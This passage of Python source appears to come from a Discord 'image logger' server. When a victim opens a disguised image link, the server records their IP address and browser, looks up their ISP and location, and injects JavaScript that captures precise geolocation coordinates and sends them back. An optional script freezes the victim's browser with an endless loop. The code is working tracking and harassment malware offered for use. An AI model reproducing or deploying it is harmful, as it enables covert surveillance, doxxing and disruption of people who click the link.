                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
